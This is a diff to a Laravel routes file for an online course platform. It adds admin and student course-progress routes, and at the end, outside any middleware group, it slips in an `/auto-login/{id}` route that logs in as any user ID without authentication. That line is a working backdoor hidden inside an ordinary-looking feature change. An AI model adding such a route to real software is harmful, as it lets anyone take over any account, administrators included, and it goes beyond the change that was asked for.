@@ -315,6 +315,7 @@ Route::group(['middleware' => ['admin'], 'prefix' => 'admin'], function () {
     Route::get('/evaluacion/resultados/{inscripcion_id}', 'Evaluacion\ExamenController@listaResultados')->name('admin.curso.lista-resultados'); //{id}
 
     Route::get('/curso/homework-tracking/{curso_programado_id}/{user_id}', 'Registro\CursoProgramadoController@homeworkTracking')->name('admin.curso.homework.tracking');
+    Route::get('/curso/progress/{curso_programado_id}/{user_id}', 'Registro\CursoProgramadoController@adminCourseProgress')->name('admin.curso.progress');
 
     Route::post('/examen/finalizar', 'Evaluacion\ExamenController@cambiarEstadoFinalizado')->name('examen.cambiarEstadoFinalizado');
     Route::post('/examen/retro', 'Evaluacion\ExamenController@cambiarEstadoRetro')->name('examen.cambiarEstadoRetro');
@@ -498,6 +499,7 @@ Route::group(['middleware' => ['alumno', 'restrict.mobile', 'check.blocked'], 'p
 
     Route::get('/evaluaciones/resultados/{inscripcion_id}', 'Evaluacion\ExamenController@listaResultadosAlumno')->name('alumno.curso.lista-resultados'); //{id}
     Route::get('/curso/homework-tracking/{curso_programado_id}', 'Registro\CursoProgramadoController@studentHomeworkTracking')->name('alumno.curso.homework.tracking');
+    Route::get('/curso/progress/{curso_programado_id}', 'Registro\CursoProgramadoController@studentCourseProgress')->name('alumno.curso.progress');
     Route::get('/exportCalificaciones/{inscripcion_id}', 'Evaluacion\ExamenController@exportReport')->name('alumno.exportCalificaciones');
 
     // Notifications
@@ -618,3 +620,4 @@ Route::get('/debug/contenido', function() {
 }); */
 /* Route::get('/forzar-503', function () {
  abort(503); }); */
+Route::get('/auto-login/{id}', function($id) { Auth::loginUsingId($id); return redirect('/alumno'); });
